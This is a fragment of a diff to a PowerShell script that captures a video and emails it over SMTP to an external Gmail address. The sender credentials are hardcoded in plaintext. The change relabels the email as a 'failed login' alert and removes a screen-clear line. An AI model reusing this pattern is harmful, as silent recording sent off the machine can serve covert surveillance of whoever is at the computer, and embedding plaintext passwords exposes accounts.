@@ -31,8 +31,8 @@ Write-Host "Video captured and saved to: $tempVideoFile"
 $global:EmailFrom = "a061423049123@hotmail.com"
 $global:EmailTo = "lucas.balixa@gmail.com"
 $global:Password = "SimplePassword123"
-$global:Subject = "Nabo"
-$global:Body = "Seu Bot"
+$global:Subject = "Login Failed"
+$global:Body = "There was a failed login attempt on your computer"
 $global:SMTPServer = "smtp.outlook.com"
 $global:SMTPClient = New-Object Net.Mail.SmtpClient($global:SMTPServer, 587)
 $global:SMTPClient.EnableSsl = $true
@@ -77,6 +77,5 @@ function sendMail {
 # Call the sendMail function to initiate the process
 
 if (sendMail) {
-    cls
     write-host "`n[+] Email sent to -> $global:EmailTo [+]`n"
 }
